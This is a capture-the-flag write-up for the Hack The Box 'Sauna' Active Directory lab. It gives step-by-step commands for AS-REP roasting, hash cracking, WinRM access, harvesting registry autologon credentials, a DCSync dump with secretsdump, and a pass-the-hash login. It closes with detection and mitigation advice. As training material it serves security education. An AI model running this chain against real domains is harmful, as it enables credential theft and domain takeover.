---
machine: Sauna
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: 2026-11-09
tags: [windows, active-directory, kerberos, asrep, winrm, dcsync]
---

# Sauna — Hack The Box

**English** | [🇪🇸 Español](README.md)

## TL;DR

The corporate site publishes the team's names, so the username format comes for free. With the list, **AS-REP roasting** against the account without pre-authentication yields a crackable hash, and WinRM gives a shell. Inside, autologon credentials sit in cleartext in the registry; that service account holds replication rights and **DCSync** follows.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,5985 <TARGET_IP>
```

| Port | Service |
|---|---|
| 80/tcp | IIS — `egotistical-bank.htb` |
| 88/389/636 | Kerberos and LDAP |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

## Enumeration

The "Meet the team" page gives first and last names. The format is first initial + surname (`fsmith`, `ssmith`, `hsmith`), domain `EGOTISTICAL-BANK.HTB`.

```bash
echo 'egotistical-bank.htb' | tee -a /etc/hosts
kerbrute userenum -d egotistical-bank.htb --dc <TARGET_IP> users.txt
```

## Foothold: AS-REP roasting

```bash
impacket-GetNPUsers 'egotistical-bank.htb/' -dc-ip <TARGET_IP> -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

With the password:

```bash
evil-winrm -i <TARGET_IP> -u fsmith -p '<password>'
type C:\Users\fsmith\Desktop\user.txt
```

## Lateral movement

On the host, WinPEAS (or a direct query) reads the autologon credentials Windows stores in cleartext:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# DefaultUserName / DefaultPassword -> svc_loanmanager
```

Mind the name: the registry value is `svc_loanmanager`, but the real `sAMAccountName` is `svc_loanmgr`; the first one fails over WinRM. Check with NetExec and log in with the second:

```bash
nxc smb <TARGET_IP> -u svc_loanmgr -p '<password>'
evil-winrm -i <TARGET_IP> -u svc_loanmgr -p '<password>'
```

## Escalation: DCSync

`svc_loanmgr` holds replication rights, so dump the database:

```bash
impacket-secretsdump 'egotistical-bank.htb/svc_loanmgr:<newpass>@<TARGET_IP>' -just-dc-user Administrator
```

With Administrator's hash: `impacket-psexec -hashes ':<NT_HASH>' administrator@<TARGET_IP>`.

## Typical errors

- **`KDC_ERR_C_PRINCIPAL_UNKNOWN`** → wrong username format; also try first.last.
- **No AS-REP results** → the account does require pre-auth; roasting does not apply.
- **`Access is denied` over WinRM** → the user is not in `Remote Management Users`.
- **DCSync denied** → the account lacks `DS-Replication-Get-Changes`; check the real ACL in BloodHound.

## Detection and mitigation

- **4768** without pre-auth (AS-REP) and anomalous **4769**.
- Clear `DONT_REQ_PREAUTH` on service accounts and enforce long passwords.
- Never leave `DefaultPassword` in `Winlogon`: use LAPS or managed accounts for autologon.
- Review `DS-Replication-Get-Changes` on service accounts and alert on `secretsdump` (DRSUAPI).

MITRE: T1558.004, T1098, T1003.006.
